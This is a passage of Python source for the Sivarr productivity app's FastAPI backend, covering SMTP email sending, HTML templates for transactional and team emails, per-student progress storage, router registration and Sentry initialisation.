        log.info(f"Email sent via Resend: '{subject}' → {to}")
        return True, "ok"
    except Exception as exc:
        log.error(f"Resend send failed: {exc}")
        return False, str(exc)


def _send_email_gmail(to: str, subject: str, html_body: str) -> tuple[bool, str]:
    """Send via Gmail SMTP using an App Password. No domain registration required."""
    import smtplib
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    try:
        msg = MIMEMultipart("alternative")
        msg["Subject"] = subject
        msg["From"]    = f"Sivarr <{GMAIL_USER}>"
        msg["To"]      = to
        msg["Reply-To"] = RESEND_REPLY_TO
        msg.attach(MIMEText(html_body, "html", "utf-8"))
        with smtplib.SMTP("smtp.gmail.com", 587, timeout=15) as server:
            server.ehlo()
            server.starttls()
            server.login(GMAIL_USER, GMAIL_APP_PASSWORD)
            server.sendmail(GMAIL_USER, [to], msg.as_string())
        log.info(f"Email sent via Gmail: '{subject}' → {to}")
        return True, "ok"
    except Exception as exc:
        log.error(f"Gmail SMTP send failed: {exc}")
        return False, str(exc)


def _email_reset_html(reset_url: str) -> str:
    return f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"></head>
<body style="font-family:system-ui,sans-serif;max-width:480px;margin:40px auto;padding:24px;color:#1a1a1a">
  <div style="margin-bottom:28px">
    <span style="font-size:1.3rem;font-weight:800;color:#41076B;letter-spacing:-.03em">Sivarr</span>
  </div>
  <h2 style="margin:0 0 10px;font-size:1.4rem">Reset your password</h2>
  <p style="color:#555;line-height:1.6;margin:0 0 28px">
    We received a request to reset the password for your Sivarr account.<br>
    Click below to choose a new one. This link expires in <strong>1 hour</strong>.
  </p>
  <a href="{reset_url}"
     style="display:inline-block;background:#41076B;color:#fff;padding:13px 32px;
            border-radius:9px;text-decoration:none;font-weight:700;font-size:.95rem">
    Reset my password →
  </a>
  <p style="color:#999;font-size:.78rem;margin-top:32px;line-height:1.5">
    If you didn't request this, you can safely ignore this email.<br>
    Your password won't change until you click the link above.
  </p>
  <hr style="border:none;border-top:1px solid #eee;margin:28px 0">
  <p style="color:#bbb;font-size:.72rem;text-align:center;margin:0">
    Sivarr · Your productivity OS
  </p>
</body></html>"""


def _email_verify_html(verify_url: str, name: str) -> str:
    return f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"></head>
<body style="font-family:system-ui,sans-serif;max-width:480px;margin:40px auto;padding:24px;color:#1a1a1a">
  <div style="margin-bottom:28px">
    <span style="font-size:1.3rem;font-weight:800;color:#41076B;letter-spacing:-.03em">Sivarr</span>
  </div>
  <h2 style="margin:0 0 10px;font-size:1.4rem">Welcome, {name} 👋</h2>
  <p style="color:#555;line-height:1.6;margin:0 0 28px">
    You're one step away. Confirm your email address to activate your Sivarr
    account and open your workspace.<br>
    This link expires in <strong>24 hours</strong>.
  </p>
  <a href="{verify_url}"
     style="display:inline-block;background:#41076B;color:#fff;padding:13px 32px;
            border-radius:9px;text-decoration:none;font-weight:700;font-size:.95rem">
    Confirm my email →
  </a>
  <p style="color:#999;font-size:.78rem;margin-top:32px;line-height:1.5">
    If you didn't create a Sivarr account, you can safely ignore this email.
  </p>
  <hr style="border:none;border-top:1px solid #eee;margin:28px 0">
  <p style="color:#bbb;font-size:.72rem;text-align:center;margin:0">
    Sivarr · Your productivity OS
  </p>
</body></html>"""


def _email_org_invite_html(inviter_name: str, org_name: str, join_url: str, role: str) -> str:
    # Escape attacker-controlled values (org name + inviter's display name) — they are
    # interpolated into HTML sent to arbitrary recipients (prevents HTML/phishing injection).
    inviter_name = html.escape(inviter_name or "")
    org_name     = html.escape(org_name or "")
    role         = html.escape(role or "")
    return f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"></head>
<body style="font-family:system-ui,sans-serif;max-width:480px;margin:40px auto;padding:24px;color:#1a1a1a">
  <div style="margin-bottom:28px">
    <span style="font-size:1.3rem;font-weight:800;color:#41076B;letter-spacing:-.03em">Sivarr</span>
  </div>
  <h2 style="margin:0 0 10px;font-size:1.4rem">You're invited to join <strong>{org_name}</strong></h2>
  <p style="color:#555;line-height:1.6;margin:0 0 8px">
    <strong>{inviter_name}</strong> has invited you to join <strong>{org_name}</strong> on Sivarr as a <strong>{role}</strong>.
  </p>
  <p style="color:#555;line-height:1.6;margin:0 0 28px">
    Sivarr brings your team's tasks, projects, docs, AI, and chat into one workspace.
    Accept below to jump in. This invite expires in <strong>7 days</strong>.
  </p>
  <a href="{join_url}"
     style="display:inline-block;background:#41076B;color:#fff;padding:13px 32px;
            border-radius:9px;text-decoration:none;font-weight:700;font-size:.95rem">
    Accept Invite &amp; Join {org_name} →
  </a>
  <p style="color:#999;font-size:.78rem;margin-top:32px;line-height:1.5">
    If you weren't expecting this, you can safely ignore this email.
  </p>
  <hr style="border:none;border-top:1px solid #eee;margin:28px 0">
  <p style="color:#bbb;font-size:.72rem;text-align:center;margin:0">Sivarr · Your productivity OS</p>
</body></html>"""


def _email_welcome_html(name: str) -> str:
    url = f"{BASE_URL.rstrip('/')}/"
    first = name.split()[0] if name else name
    return f"""<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
</head>
<body style="margin:0;padding:0;background:#f9f9f9;font-family:system-ui,-apple-system,sans-serif">
  <!-- Preheader (hidden preview text) -->
  <span style="display:none;max-height:0;overflow:hidden;mso-hide:all">Your workspace is waiting for you.</span>
  <table width="100%" cellpadding="0" cellspacing="0" style="background:#f9f9f9;padding:40px 0">
    <tr><td align="center">
      <table width="520" cellpadding="0" cellspacing="0" style="background:#ffffff;border-radius:12px;padding:40px 48px;max-width:520px;width:100%">

        <!-- Logo -->
        <tr><td style="padding-bottom:32px">
          <span style="font-size:1.4rem;font-weight:900;color:#41076B;letter-spacing:-.04em">Sivarr</span>
        </td></tr>

        <!-- Greeting -->
        <tr><td style="font-size:1rem;color:#1a1a1a;padding-bottom:16px;line-height:1.6">
          Hello {first},
        </td></tr>

        <!-- Opening line -->
        <tr><td style="font-size:1rem;color:#1a1a1a;padding-bottom:28px;line-height:1.6">
          Your Sivarr workspace is ready. Welcome aboard.
        </td></tr>

        <!-- CTA Button 1 -->
        <tr><td style="padding-bottom:20px">
          <a href="{url}" style="display:inline-block;color:#C0392B;font-weight:800;font-size:.95rem;text-decoration:none;letter-spacing:.04em">
            OPEN MY Sivarr WORKSPACE
          </a>
        </td></tr>

        <!-- Sub-caption -->
        <tr><td style="font-size:.92rem;color:#555;font-style:italic;padding-bottom:28px;line-height:1.6">
          Click the link above to get started.
        </td></tr>

        <!-- Body copy -->
        <tr><td style="font-size:.95rem;color:#1a1a1a;padding-bottom:12px;line-height:1.6">
          Here's what you can do inside:
        </td></tr>

        <!-- Feature list -->
        <tr><td style="padding-bottom:28px">
          <ul style="margin:0;padding-left:24px;color:#1a1a1a;font-size:.95rem;line-height:2">
            <li>Ask questions and have a personalized chat with your AI assistant.</li>
            <li>Process your emotions through daily logs in your personal journal.</li>
            <li>Set daily, weekly, monthly and yearly goals and track your progress.</li>
            <li>Study faster by creating notes and study materials.</li>
          </ul>
        </td></tr>

        <!-- And more -->
        <tr><td style="font-size:.95rem;color:#1a1a1a;padding-bottom:12px;line-height:1.6">
          And the best part?
        </td></tr>
        <tr><td style="font-size:.95rem;color:#1a1a1a;padding-bottom:12px;line-height:1.6">
          You get to use <strong>multiple</strong> tools in <strong>one</strong> platform.
        </td></tr>
        <tr><td style="font-size:.95rem;color:#1a1a1a;padding-bottom:12px;line-height:1.6">
          Your entire workflow, from idea to execution will now exist in one central system.
        </td></tr>
        <tr><td style="font-size:.95rem;color:#1a1a1a;padding-bottom:12px;line-height:1.6">
          To make sure you have the best experience&hellip;
        </td></tr>
        <tr><td style="font-size:.95rem;color:#1a1a1a;padding-bottom:28px;line-height:1.6">
          We will be sending tips and guides to help you get the most out of every feature.
        </td></tr>

        <!-- Repeat link -->
        <tr><td style="font-size:.95rem;color:#1a1a1a;padding-bottom:12px;line-height:1.6">
          Here&rsquo;s your access link again:
        </td></tr>

        <!-- CTA Button 2 -->
        <tr><td style="padding-bottom:28px">
          <a href="{url}" style="display:inline-block;color:#C0392B;font-weight:800;font-size:.95rem;text-decoration:none;letter-spacing:.04em">
            OPEN MY Sivarr WORKSPACE
          </a>
        </td></tr>

        <!-- Closing -->
        <tr><td style="font-size:.95rem;color:#1a1a1a;padding-bottom:20px;line-height:1.6">
          We can&rsquo;t wait to see what you build with Sivarr.
        </td></tr>
        <tr><td style="font-size:.92rem;color:#555;font-style:italic;padding-bottom:28px;line-height:1.8">
          See you inside,<br>The Sivarr Team
        </td></tr>

        <tr><td style="font-size:.88rem;color:#1a1a1a;padding-bottom:32px;line-height:1.6">
          P.S. Run into any issue? Just reply to this email and our team will help you out.
        </td></tr>

        <!-- Footer -->
        <tr><td style="border-top:1px solid #eee;padding-top:20px">
          <p style="margin:0;font-size:.72rem;color:#bbb;text-align:center">Sivarr &middot; Your productivity OS</p>
        </td></tr>

      </table>
    </td></tr>
  </table>
</body></html>"""


def _email_digest_html(name: str, tasks: list, goals: list) -> str:
    """Daily briefing email — tasks due/overdue + goals with upcoming deadlines."""
    today = datetime.date.today().isoformat()
    overdue   = [t for t in tasks if not t.get("done") and t.get("date") and t["date"] < today]
    due_today = [t for t in tasks if not t.get("done") and t.get("date") == today]
    act_goals = [g for g in goals if not g.get("completed") and g.get("deadline")]

    if not overdue and not due_today and not act_goals:
        return ""  # nothing worth sending today

    task_rows = ""
    for t in (due_today + overdue)[:6]:
        label = "due today" if t.get("date") == today else f'overdue ({t.get("date","")})'
        colour = "#41076B" if t.get("date") == today else "#E8614A"
        task_rows += (
            f'<li style="margin-bottom:8px;color:#1a1a1a">'
            f'{t["title"]}'
            f'<span style="color:{colour};font-size:.78rem;margin-left:6px">{label}</span>'
            f'</li>'
        )
    task_section = (
        f'<h3 style="font-size:.95rem;font-weight:700;margin:0 0 10px;color:#555;'
        f'text-transform:uppercase;letter-spacing:.06em">Tasks</h3>'
        f'<ul style="padding-left:18px;margin:0 0 28px;line-height:1.9">{task_rows}</ul>'
    ) if task_rows else ""

    goal_rows = ""
    for g in act_goals[:4]:
        try:
            days = (datetime.date.fromisoformat(g["deadline"]) - datetime.date.today()).days
        except Exception:
            continue
        if days < 0 or days > 7:
            continue
        label  = "today!" if days == 0 else f"in {days}d"
        pct    = g.get("progress", 0)
        goal_rows += (
            f'<li style="margin-bottom:8px;color:#1a1a1a">'
            f'{g["title"]}'
            f'<span style="color:#7B2CAD;font-size:.78rem;margin-left:6px">'
            f'deadline {label} · {pct}% done</span>'
            f'</li>'
        )
    goal_section = (
        f'<h3 style="font-size:.95rem;font-weight:700;margin:0 0 10px;color:#555;'
        f'text-transform:uppercase;letter-spacing:.06em">Goals</h3>'
        f'<ul style="padding-left:18px;margin:0 0 28px;line-height:1.9">{goal_rows}</ul>'
    ) if goal_rows else ""

    if not task_section and not goal_section:
        return ""

    return f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
<body style="font-family:system-ui,-apple-system,sans-serif;max-width:520px;margin:40px auto;padding:24px;color:#1a1a1a;background:#fff">
  <div style="margin-bottom:28px;display:flex;align-items:center;gap:10px">
    <div style="width:28px;height:28px;border-radius:8px;background:linear-gradient(135deg,#41076B,#7B2CAD);
                display:inline-flex;align-items:center;justify-content:center">
      <span style="color:#fff;font-weight:900;font-size:.75rem">S</span>
    </div>
    <span style="font-size:1.1rem;font-weight:800;color:#41076B;letter-spacing:-.03em">Sivarr</span>
  </div>
  <h2 style="margin:0 0 6px;font-size:1.35rem;font-weight:800;letter-spacing:-.02em">
    Good morning, {name} ☀️
  </h2>
  <p style="color:#666;line-height:1.6;margin:0 0 28px;font-size:.95rem">
    Here's what needs your attention today.
  </p>
  {task_section}
  {goal_section}
  <a href="{BASE_URL}/app"
     style="display:inline-block;background:#41076B;color:#fff;padding:13px 32px;
            border-radius:9px;text-decoration:none;font-weight:700;font-size:.92rem;
            letter-spacing:-.01em">
    Open Sivarr →
  </a>
  <hr style="border:none;border-top:1px solid #f0f0f0;margin:32px 0 20px">
  <p style="color:#bbb;font-size:.72rem;text-align:center;margin:0;line-height:1.6">
    Sivarr · Your productivity OS<br>
    You're getting this because daily digests are on in your settings.
  </p>
</body></html>"""


def _email_task_reminder_html(name: str, tasks: list) -> str:
    rows = "".join(
        f'<li style="margin-bottom:8px;color:#333">{t["title"]}'
        f'<span style="color:#888;font-size:.8rem"> · due {t.get("due","today")}</span></li>'
        for t in tasks[:5]
    )
    return f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"></head>
<body style="font-family:system-ui,sans-serif;max-width:480px;margin:40px auto;padding:24px;color:#1a1a1a">
  <div style="margin-bottom:28px">
    <span style="font-size:1.3rem;font-weight:800;color:#41076B;letter-spacing:-.03em">Sivarr</span>
  </div>
  <h2 style="margin:0 0 10px;font-size:1.4rem">Tasks due soon, {name}</h2>
  <p style="color:#555;line-height:1.6;margin:0 0 16px">
    You have <strong>{len(tasks)}</strong> task{"s" if len(tasks) != 1 else ""} due today or tomorrow:
  </p>
  <ul style="padding-left:20px;margin:0 0 28px;line-height:1.8">{rows}</ul>
  <a href="{BASE_URL}"
     style="display:inline-block;background:#41076B;color:#fff;padding:13px 32px;
            border-radius:9px;text-decoration:none;font-weight:700;font-size:.95rem">
    Open Tasks
  </a>
  <hr style="border:none;border-top:1px solid #eee;margin:28px 0">
  <p style="color:#bbb;font-size:.72rem;text-align:center;margin:0;line-height:1.6">
    Sivarr · Your productivity OS<br>
    You're getting this because task reminders are on in your settings.
  </p>
</body></html>"""


def _email_billing_receipt_html(name: str, plan: str, amount: str, ref: str) -> str:
    return f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"></head>
<body style="font-family:system-ui,sans-serif;max-width:480px;margin:40px auto;padding:24px;color:#1a1a1a">
  <div style="margin-bottom:28px">
    <span style="font-size:1.3rem;font-weight:800;color:#41076B;letter-spacing:-.03em">Sivarr</span>
  </div>
  <h2 style="margin:0 0 10px;font-size:1.4rem">Payment confirmed ✓</h2>
  <p style="color:#555;line-height:1.6;margin:0 0 8px">Thanks, {name}. Your payment went through and your subscription is active. Here's your receipt:</p>
  <table style="width:100%;border-collapse:collapse;margin:16px 0 28px">
    <tr><td style="padding:10px 0;border-bottom:1px solid #eee;color:#888">Plan</td>
        <td style="padding:10px 0;border-bottom:1px solid #eee;font-weight:600">{plan}</td></tr>
    <tr><td style="padding:10px 0;border-bottom:1px solid #eee;color:#888">Amount</td>
        <td style="padding:10px 0;border-bottom:1px solid #eee;font-weight:600">{amount}</td></tr>
    <tr><td style="padding:10px 0;color:#888">Reference</td>
        <td style="padding:10px 0;font-size:.78rem;color:#555">{ref}</td></tr>
  </table>
  <a href="{BASE_URL}"
     style="display:inline-block;background:#41076B;color:#fff;padding:13px 32px;
            border-radius:9px;text-decoration:none;font-weight:700;font-size:.95rem">
    Open Sivarr
  </a>
  <hr style="border:none;border-top:1px solid #eee;margin:28px 0">
  <p style="color:#bbb;font-size:.72rem;text-align:center;margin:0">Sivarr · Your productivity OS</p>
</body></html>"""


def _email_org_mention_html(recipient_name: str, sender_name: str, org_name: str,
                            channel: str, preview: str) -> str:
    # Escape all org/member-controlled values — they're interpolated into HTML
    # emailed to other members (prevents stored-HTML / phishing injection).
    first        = html.escape((recipient_name.split()[0] if recipient_name else "") or "")
    sender_name  = html.escape(sender_name or "")
    org_name     = html.escape(org_name or "")
    channel      = html.escape(channel or "")
    safe_preview = html.escape((preview or "")[:300])
    return f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
<body style="font-family:system-ui,-apple-system,sans-serif;max-width:480px;margin:40px auto;padding:24px;color:#1a1a1a">
  <div style="margin-bottom:24px">
    <span style="font-size:1.3rem;font-weight:800;color:#41076B;letter-spacing:-.03em">Sivarr</span>
  </div>
  <h2 style="margin:0 0 6px;font-size:1.3rem;font-weight:800">You were mentioned, {first}</h2>
  <p style="color:#666;font-size:.9rem;margin:0 0 20px">
    <strong>{sender_name}</strong> mentioned you in <strong>#{channel}</strong> · {org_name}
  </p>
  <div style="background:#f6f6f6;border-left:3px solid #41076B;border-radius:4px;
              padding:14px 16px;margin-bottom:28px;font-size:.95rem;line-height:1.6;color:#333">
    {safe_preview}
  </div>
  <a href="{BASE_URL}/app"
     style="display:inline-block;background:#41076B;color:#fff;padding:12px 28px;
            border-radius:9px;text-decoration:none;font-weight:700;font-size:.92rem">
    View in Sivarr →
  </a>
  <hr style="border:none;border-top:1px solid #eee;margin:28px 0">
  <p style="color:#bbb;font-size:.7rem;text-align:center;margin:0;line-height:1.6">
    Sivarr · Your productivity OS<br>
    You're getting this because you're a member of {org_name}.
  </p>
</body></html>"""


def _email_org_announcement_html(recipient_name: str, org_name: str,
                                  author_name: str, title: str, body: str) -> str:
    # Escape all org/member-controlled values — interpolated into HTML emailed
    # to other members (prevents stored-HTML / phishing injection).
    first       = html.escape((recipient_name.split()[0] if recipient_name else "") or "")
    org_name    = html.escape(org_name or "")
    author_name = html.escape(author_name or "")
    title       = html.escape(title or "")
    safe_body   = html.escape((body or "")[:1000]).replace("\n", "<br>")
    return f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
<body style="font-family:system-ui,-apple-system,sans-serif;max-width:480px;margin:40px auto;padding:24px;color:#1a1a1a">
  <div style="margin-bottom:24px">
    <span style="font-size:1.3rem;font-weight:800;color:#41076B;letter-spacing:-.03em">Sivarr</span>
  </div>
  <div style="font-size:.75rem;font-weight:700;color:#7B2CAD;text-transform:uppercase;
              letter-spacing:.06em;margin-bottom:8px">📢 Announcement · {org_name}</div>
  <h2 style="margin:0 0 6px;font-size:1.3rem;font-weight:800">{title}</h2>
  <p style="color:#888;font-size:.82rem;margin:0 0 20px">Posted by {author_name}</p>
  <p style="color:#555;font-size:.9rem;line-height:1.6;margin:0 0 16px">
    Hi {first}, {author_name} just posted an announcement in {org_name}:
  </p>
  {"<div style='background:#f6f6f6;border-radius:8px;padding:16px;margin-bottom:28px;font-size:.95rem;line-height:1.7;color:#333'>" + safe_body + "</div>" if body else ""}
  <a href="{BASE_URL}/app"
     style="display:inline-block;background:#7B2CAD;color:#fff;padding:12px 28px;
            border-radius:9px;text-decoration:none;font-weight:700;font-size:.92rem">
    View Announcement →
  </a>
  <hr style="border:none;border-top:1px solid #eee;margin:28px 0">
  <p style="color:#bbb;font-size:.7rem;text-align:center;margin:0;line-height:1.6">
    Sivarr · Your productivity OS<br>
    You're getting this because you're a member of {org_name}.
  </p>
</body></html>"""


def _email_org_progress_html(recipient_name: str, org_name: str, period: str,
                              tasks_done: int, tasks_total: int,
                              goals: list, top_contributors: list) -> str:
    first = recipient_name.split()[0] if recipient_name else recipient_name
    completion_pct = round((tasks_done / tasks_total * 100) if tasks_total else 0)
    bar_w = min(completion_pct, 100)

    goal_rows = "".join(
        f'<tr>'
        f'<td style="padding:8px 0;border-bottom:1px solid #f0f0f0;color:#333;font-size:.88rem">{g.get("title","")}</td>'
        f'<td style="padding:8px 0;border-bottom:1px solid #f0f0f0;text-align:right;font-size:.88rem">'
        f'<span style="color:#41076B;font-weight:700">{g.get("progress",0)}%</span></td>'
        f'</tr>'
        for g in goals[:5]
    ) if goals else '<tr><td colspan="2" style="padding:8px 0;color:#aaa;font-size:.85rem">No active goals this week.</td></tr>'

    contrib_rows = "".join(
        f'<li style="margin-bottom:6px;font-size:.88rem;color:#333">'
        f'<strong>{c["name"]}</strong>: {c["done"]} task{"s" if c["done"]!=1 else ""} completed</li>'
        for c in top_contributors[:5]
    ) if top_contributors else '<li style="color:#aaa;font-size:.85rem">No activity data yet.</li>'

    return f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
<body style="font-family:system-ui,-apple-system,sans-serif;max-width:520px;margin:40px auto;padding:24px;color:#1a1a1a">
  <div style="margin-bottom:24px;display:flex;align-items:center;gap:10px">
    <div style="width:28px;height:28px;border-radius:8px;background:linear-gradient(135deg,#41076B,#7B2CAD);
                display:inline-flex;align-items:center;justify-content:center">
      <span style="color:#fff;font-weight:900;font-size:.75rem">S</span>
    </div>
    <span style="font-size:1.1rem;font-weight:800;color:#41076B;letter-spacing:-.03em">Sivarr</span>
  </div>
  <div style="font-size:.75rem;font-weight:700;color:#41076B;text-transform:uppercase;
              letter-spacing:.06em;margin-bottom:8px">Weekly Progress Report · {org_name}</div>
  <h2 style="margin:0 0 4px;font-size:1.35rem;font-weight:800">Here's how the team did, {first} 📊</h2>
  <p style="color:#888;font-size:.82rem;margin:0 0 28px">{period}</p>

  <!-- Task completion -->
  <h3 style="font-size:.88rem;font-weight:700;text-transform:uppercase;letter-spacing:.06em;
             color:#888;margin:0 0 10px">Task Completion</h3>
  <div style="background:#f0f0f0;border-radius:6px;height:10px;overflow:hidden;margin-bottom:8px">
    <div style="width:{bar_w}%;height:100%;background:linear-gradient(90deg,#41076B,#7B2CAD);border-radius:6px"></div>
  </div>
  <p style="font-size:.88rem;color:#555;margin:0 0 28px">
    <strong>{tasks_done}</strong> of <strong>{tasks_total}</strong> tasks completed this week
    <span style="color:#41076B;font-weight:700;margin-left:6px">({completion_pct}%)</span>
  </p>

  <!-- Goals -->
  <h3 style="font-size:.88rem;font-weight:700;text-transform:uppercase;letter-spacing:.06em;
             color:#888;margin:0 0 10px">Goal Progress</h3>
  <table style="width:100%;border-collapse:collapse;margin-bottom:28px">
    {goal_rows}
  </table>

  <!-- Top contributors -->
  <h3 style="font-size:.88rem;font-weight:700;text-transform:uppercase;letter-spacing:.06em;
             color:#888;margin:0 0 10px">Top Contributors</h3>
  <ul style="padding-left:18px;margin:0 0 28px;line-height:1.8">{contrib_rows}</ul>

  <a href="{BASE_URL}/app"
     style="display:inline-block;background:#41076B;color:#fff;padding:13px 32px;
            border-radius:9px;text-decoration:none;font-weight:700;font-size:.92rem">
    Open Sivarr →
  </a>
  <hr style="border:none;border-top:1px solid #f0f0f0;margin:32px 0 20px">
  <p style="color:#bbb;font-size:.7rem;text-align:center;margin:0;line-height:1.6">
    Sivarr · Your productivity OS<br>
    You're getting this because you're a member of {org_name}.
  </p>
</body></html>"""


def cleanup_expired_tokens():
    now = datetime.datetime.utcnow()
    stale = [t for t, v in _session_tokens.items() if v.get("expires", now) <= now]
    for t in stale:
        del _session_tokens[t]
    if db.is_available():
        db.cleanup_db_sessions()

# get_model/get_sessions/friendly_gemini_error/gemini_ask/gemini_once/the AI
# circuit breaker/async_gemini_once/async_gemini_ask/the local math solver
# (solve_local/is_math/is_uncertain)/the topic answer cache (lpath/load_json/
# get_cached/set_cached/strip_topic)/bpath now all live in ai_core.py, imported
# back below for the endpoints in this file that still use them.

def ppath(sid):  return DATA_DIR / f"{sid}_progress.json"


_PROGRESS_DEFAULTS = {
    "sessions": 0, "questions": 0, "topics": {},
    "quizzes": [], "wrong_answers": [], "chat_history": [],
    "difficulty": "medium", "name": "", "matric": "",
    "uploaded_files": [],
    "chat_daily": {},   # {"date": "YYYY-MM-DD", "count": N} — free-tier daily chat usage
    "ai_daily": {},     # {"date": "YYYY-MM-DD", "count": N} — free-tier daily non-chat AI usage
}

def load_progress(sid):
    # Try DB first
    if db.is_available():
        try:
            data = db.db_load_progress(sid)
            if data:
                return {**_PROGRESS_DEFAULTS, **data}
        except Exception as e:
            log.warning(f"DB load_progress fallback for {sid}: {e}")
    # Fall back to JSON file
    p = ppath(sid)
    if p.exists():
        try:
            return {**_PROGRESS_DEFAULTS, **json.loads(p.read_text(encoding="utf-8"))}
        except Exception:
            pass
    return dict(_PROGRESS_DEFAULTS)


def save_progress(sid, p):
    # Write to DB
    if db.is_available():
        try:
            db.db_save_progress(sid, p)
        except Exception as e:
            log.warning(f"DB save_progress failed for {sid}: {e}")
    # Always keep JSON backup
    path = ppath(sid)
    try:
        if path.exists():
            shutil.copy2(str(path), str(path).replace(".json", ".backup.json"))
        save_json(path, p)
    except Exception as e:
        log.warning(f"JSON save_progress failed for {sid}: {e}")


def build_memory(p):
    history = p.get("chat_history", [])
    topics  = list(p.get("topics", {}).keys())
    if not history and not topics:
        return ""
    lines = ["Previous session context:"]
    for h in history[-10:]:
        lines.append(f"  {'Student' if h['role']=='user' else 'Sivarr'}: {h['message']}")
    if topics:
        lines.append(f"Topics studied: {', '.join(topics[-5:])}")
    return "\n".join(lines)


def add_history(p, sid, role, msg):
    p.setdefault("chat_history", []).append({
        "role": role, "message": msg,
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
    })
    p["chat_history"] = p["chat_history"][-HISTORY_LIMIT:]
    save_progress(sid, p)


def weak_topics(p):
    return sorted(p["topics"], key=lambda t: p["topics"][t])[:3]


def get_all_students():
    students = []
    for f in DATA_DIR.glob("*_progress.json"):
        if "backup" in f.name:
            continue
        try:
            data    = json.loads(f.read_text(encoding="utf-8"))
            quizzes = data.get("quizzes", [])
            avg     = (sum(q["score"] for q in quizzes) / len(quizzes) * 100) if quizzes else 0
            students.append({
                "name":        data.get("name", "Unknown"),
                "matric":      data.get("matric", "N/A"),
                "sessions":    data.get("sessions", 0),
                "questions":   data.get("questions", 0),
                "quizzes":     len(quizzes),
                "avg_score":   round(avg, 1),
                "topics":      list(data.get("topics", {}).keys()),
                "weak":        sorted(data.get("topics",{}), key=lambda t: data["topics"][t])[:3],
                "wrong_count": len(data.get("wrong_answers", [])),
                "difficulty":  data.get("difficulty", "medium"),
                "last_seen":   data.get("chat_history", [{}])[-1].get("time", "Never") if data.get("chat_history") else "Never",
            })
        except Exception as e:
            log.error(f"Error reading student file {f}: {e}")
            continue
    return sorted(students, key=lambda s: s["sessions"], reverse=True)

# ═══════════════════════════════════════════════════════════════
#  QUIZ JSON PARSER
# ═══════════════════════════════════════════════════════════════

# parse_quiz_json now lives in routes/quiz.py.


# ═══════════════════════════════════════════════════════════════
#  FASTAPI APP
# ═══════════════════════════════════════════════════════════════

app = FastAPI(title="Sivarr AI", version=VERSION)

# AI/Gemini infrastructure re-exported from ai_core.py — the endpoints in this
# file that haven't been extracted yet (quiz, weekly review, Home brief, the
# writing assistant, admin AI-health metrics) still call these directly.
from ai_core import (
    GEMINI_AVAILABLE,
    get_sessions, gemini_once, async_gemini_once, async_gemini_ask,
    _chat_sessions, _AI_BREAKER, _AI_BREAK_THRESHOLD, _AI_BREAK_COOLDOWN, _ai_breaker_open,
)

# ── Feature route modules ─────────────────────────────────────────
# These import their shared helpers from core.py, not from this module, so they
# can be included here at the top rather than 7,000 lines down. Adding a new
# router is now a two-line change with no ordering constraint.
from routes.tasks import router as _tasks_router, load_tasks, save_tasks
from routes.habits import router as _habits_router, load_habits
from routes.docs_notes import router as _docs_notes_router, load_docs
from routes.goals import router as _goals_router, load_goals, save_goals
from routes.journal import router as _journal_router, load_journal
from routes.skills import router as _skills_router
from routes.finance import router as _finance_router
from routes.home_brief import router as _home_brief_router

app.include_router(_tasks_router)
app.include_router(_habits_router)
app.include_router(_docs_notes_router)
app.include_router(_goals_router)
app.include_router(_journal_router)
app.include_router(_skills_router)
app.include_router(_finance_router)
app.include_router(_home_brief_router)

# routes/quiz.py's build_router() only needs load_progress/save_progress, which
# are both already defined above this point (see just above "app = FastAPI(...)")
# — no real ordering constraint, unlike ai_chat/ai_features below.
from routes.quiz import build_router as _build_quiz_router
app.include_router(_build_quiz_router(load_progress, save_progress))

# routes/ai_chat.py and routes/ai_features.py are NOT included here — they need
# _chat_authorize/_ai_meter (which need _plan_caps/_plan_is_active, billing
# logic not defined until further down), so
# its build_router(...) call and include_router() sit right after
# _chat_authorize's own definition instead (see routes/ai_chat.py's module
# docstring for why _chat_authorize itself stays in app.py rather than moving).
_START_TIME    = time.time()
_health_cache: dict = {"result": None, "ts": 0.0}
_db_health_cache: dict = {"info": None, "ts": 0.0}

# ── Jinja2 template environment (lazy-loaded) ──
_JINJA_ENV = None

def _get_jinja_env():
    global _JINJA_ENV
    if _JINJA_ENV is None:
        _JINJA_ENV = Environment(
            loader=FileSystemLoader("templates"),
            autoescape=select_autoescape(["html", "xml"]),
            enable_async=False,
        )
        # asset("/js/app.js") -> "/js/app.js?v=<content-hash>". Templates must use
        # this for every /css/, /js/ and /static/ URL — those paths are served
        # immutable for a year, so an unversioned URL can never be updated in a
        # browser that has already loaded it. See core.py's asset() for the detail.
        _JINJA_ENV.globals["asset"] = asset
    return _JINJA_ENV

# ── Cached HTML for production ──
_APP_HTML_CACHE: str | None = None

async def _cached_db_test(max_age: float = 5.0) -> dict:
    """Live DB ping (db.db_test) cached for `max_age` seconds so frequent
    health calls don't hammer the cross-region pooler. Shared by /health and
    /api/health. Runs the blocking psycopg2 ping off the event loop."""
    now = time.time()
    if _db_health_cache["info"] is not None and now - _db_health_cache["ts"] < max_age:
        return _db_health_cache["info"]
    info = await asyncio.to_thread(db.db_test)
    _db_health_cache["info"] = info
    _db_health_cache["ts"]   = now
    return info

# Init Sentry before any middleware so it captures all errors
if SENTRY_AVAILABLE and SENTRY_DSN:
    sentry_sdk.init(
        dsn=SENTRY_DSN,
        integrations=[StarletteIntegration(), FastApiIntegration()],
        traces_sample_rate=0.1,
        send_default_pii=False,
        # Secret-leak prevention: send_default_pii=False alone does NOT scrub request
        # bodies or stack-frame locals, and Sentry's default scrubber only catches keys
        # literally named password/secret/etc. (not e.g. "key"/"totp"). On an auth +
        # payments app those carry credentials, so we never capture either.
        max_request_body_size="never",      # don't ship HTTP request bodies
        include_local_variables=False,       # don't ship stack-frame locals
        release=VERSION,
        environment=os.environ.get("RAILWAY_ENVIRONMENT", "production"),
    )
    log.info("Sentry initialized")

from fastapi.staticfiles import StaticFiles
